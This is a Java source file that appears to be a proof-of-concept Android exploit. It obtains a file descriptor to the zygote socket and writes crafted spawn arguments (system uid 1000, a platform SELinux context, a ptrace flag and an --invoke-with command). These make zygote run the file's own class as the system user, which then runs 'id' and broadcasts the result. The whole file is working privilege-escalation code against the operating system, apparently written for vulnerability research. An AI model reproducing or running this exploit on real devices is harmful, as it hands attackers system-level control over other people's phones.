package com.example.thisseemswrong;

import android.app.ActivityManager;
import android.content.Intent;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.os.Process;
import android.system.ErrnoException;
import android.system.Os;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.SocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.stream.Collectors;

public class GrabZygote {
    private static Object sZygoteAddress;

    static boolean isZygote(ParcelFileDescriptor pfd) throws ReflectiveOperationException {
        if (sZygoteAddress == null) {
            sZygoteAddress = Class.forName("android.system.UnixSocketAddress")
                    .getMethod("createFileSystem", String.class)
                    .invoke(null, "/dev/socket/zygote");
        }
        try {
            SocketAddress peername = Os.getpeername(pfd.getFileDescriptor());
            Log.v(MainActivity.TAG, "getpeername=" + peername);
            return sZygoteAddress.equals(peername);
        } catch (ErrnoException e) {
            return false;
        }
    }

    static void sendRequestToZygote(ParcelFileDescriptor zygoteFd, String classpath) throws IOException {
        zygoteFd.getFileDescriptor();
        ArrayList<String> zygoteArgs = new ArrayList<>(Arrays.asList(
                "--runtime-args",
                "--setuid=1000",
                "--setgid=1000",
                "--seinfo=platform:privapp:targetSdkVersion=34:partition=system_ext:complete",
                "--runtime-flags=33554432", // DEBUG_ENABLE_PTRACE
                "--invoke-with","env CLASSPATH=" + classpath + " /system/bin/app_process /system/bin " + GrabZygote.class.getName(),
                "com.example.FakeMainClass"
        ));
        zygoteArgs.add(0, String.valueOf(zygoteArgs.size()));
        new FileOutputStream(zygoteFd.getFileDescriptor()).write(
                zygoteArgs.stream().collect(Collectors.joining("\n", "", "\n")).getBytes(StandardCharsets.UTF_8));
        new DataInputStream(new FileInputStream(zygoteFd.getFileDescriptor())).readFully(new byte[5]);
    }

    static String getId() {
        try {
            return new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("id").getInputStream())).readLine();
        } catch (IOException e) {
            e.printStackTrace();
            return "uid=" + Process.myUid() + ". Execution of id command failed";
        }
    }

    public static void main(String[] args) throws Exception {
        Log.v(MainActivity.TAG, "Shellcode executed in uid " + Process.myUid());
        for (int i = 0; i < args.length - 1; i++) {
            if ("com.android.internal.os.WrapperInit".equals(args[i])) {
                try {
                    ParcelFileDescriptor.AutoCloseOutputStream s = new ParcelFileDescriptor.AutoCloseOutputStream(ParcelFileDescriptor.adoptFd(Integer.parseInt(args[i + 1])));
                    s.write(new byte[]{0x41, 0x42, 0x43, 0x44});
                    s.close();
                    Log.e(MainActivity.TAG, "Closing WrapperInit ok");
                } catch (IOException e) {
                    Log.e(MainActivity.TAG, "Closing WrapperInit failed", e);
                }
            }
        }

        Object am = ActivityManager.class.getMethod("getService").invoke(null);
        am
                .getClass()
                .getMethod(
                        "broadcastIntent",
                        Class.forName("android.app.IApplicationThread"),
                        Intent.class,
                        String.class,
                        Class.forName("android.content.IIntentReceiver"),
                        int.class,
                        String.class,
                        Bundle.class,
                        String[].class,
                        int.class,
                        Bundle.class,
                        boolean.class,
                        boolean.class,
                        int.class
                ).invoke(
                        am,
                        null, // caller
                        new Intent("com.example.thisseemswrong.SHELLCODE_REPORT")
                                .putExtra("a", getId())
                                .setFlags(Intent.FLAG_RECEIVER_REGISTERED_ONLY),
                        null, // resolvedType
                        null, // resultTo
                        0, // resultCode
                        null, // resultData
                        null, // map
                        null, // requiredPermissions
                        -1, // appOp = OP_NONE
                        null, // options
                        false, // serialized
                        true, // stricky
                        -1 // user = USER_ALL
                );
        Log.e(MainActivity.TAG, "Broadcast sent, finishing");
    }
}
